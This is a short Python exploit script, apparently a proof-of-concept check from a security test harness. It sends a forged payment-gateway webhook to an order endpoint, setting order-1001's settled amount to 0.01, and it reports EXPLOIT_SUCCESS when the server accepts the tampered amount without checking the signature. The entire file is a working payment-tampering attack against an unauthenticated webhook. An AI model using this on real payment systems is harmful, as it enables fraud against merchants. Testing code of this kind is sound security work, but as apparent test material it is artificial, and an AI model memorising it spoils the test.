import os
import sys
import requests

def main():
    base_url = os.environ.get("TARGET_URL", "http://localhost:8080").rstrip("/")
    order_id = "order-1001"
    tampered_amount = 0.01

    try:
        # Fetch the original order amount to show the delta
        orig_amount = None
        try:
            r0 = requests.get(f"{base_url}/api/payments/order/{order_id}", timeout=4)
            if r0.status_code == 200:
                orig_amount = r0.json().get("amount")
        except Exception:
            pass

        # Send spoofed webhook — no auth required, no signature check enforced
        resp = requests.post(
            f"{base_url}/api/webhook/gateway",
            json={"orderId": order_id, "amount": tampered_amount, "signature": "forged"},
            timeout=4,
        )

        if resp.status_code == 200:
            data = resp.json()
            settled = data.get("amount")
            status = data.get("status", "")
            if status == "settled" and float(settled) == tampered_amount:
                print(
                    f"EXPLOIT_SUCCESS: order {order_id} settled at tampered amount={tampered_amount}"
                    f" (original={orig_amount}); server never reconciled against authoritative DB amount"
                )
            else:
                print(f"EXPLOIT_FAIL: unexpected response body - status={status} amount={settled}")
        else:
            print(f"EXPLOIT_FAIL: webhook returned HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as exc:
        print(f"EXPLOIT_FAIL: exception - {str(exc)[:200]}")

    sys.exit(0)

if __name__ == "__main__":
    main()

